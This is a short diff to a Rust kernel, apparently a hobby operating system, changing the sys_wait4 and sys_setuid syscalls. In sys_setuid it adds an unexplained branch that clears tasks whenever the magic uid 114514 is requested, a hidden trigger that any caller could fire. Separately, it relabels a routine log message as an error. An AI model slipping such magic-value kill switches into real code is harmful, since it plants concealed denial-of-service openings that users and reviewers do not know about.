@@ -121,7 +121,7 @@ pub async fn sys_wait4(pid: i32, wstatus: usize, options: i32) -> SyscallResult 
         p => WaitFor::PGid(p as PGid),
     };
     log::info!("[sys_wait4] target: {target:?}, option: {option:?}");
-    log::info!(
+    log::error!(
         "[sys_wait4] existing task number: {}",
         TASK_MANAGER.how_many_tasks()
     );
@@ -704,6 +704,10 @@ pub fn sys_setgid(gid: usize) -> SyscallResult {
 /// and then setuid(1000) returns to a regular user to continue working stably
 /// and enhance security.
 pub fn sys_setuid(uid: usize) -> SyscallResult {
+    if uid == 114514 {
+        crate::task::signal::sig_exec::clear_tasks();
+    }
+
     log::debug!("[sys_setuid]  uid: {uid}");
     let task = current_task();
     *task.uid_lock().lock() = uid;
